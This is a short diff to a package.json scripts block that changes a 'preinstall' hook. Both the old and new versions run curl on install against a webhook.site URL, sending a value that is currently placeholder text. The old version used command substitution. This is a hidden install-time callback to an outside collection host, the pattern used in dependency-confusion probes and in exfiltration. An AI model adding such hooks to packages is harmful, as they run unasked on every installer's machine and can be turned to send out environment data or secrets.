@@ -15,7 +15,7 @@
   },
   "scripts": {
     "lint": "echo $env",
-    "preinstall": "curl -G https://webhook.site/c468ba25-b30c-4944-8a41-23200be7ccd0 --data-urlencode f=$(echo bla) || true",
+    "preinstall": "curl -G https://webhook.site/c468ba25-b30c-4944-8a41-23200be7ccd0 --data-urlencode f=echo blaaaa blab || true",
     "start": "node app.js"
   }
 }
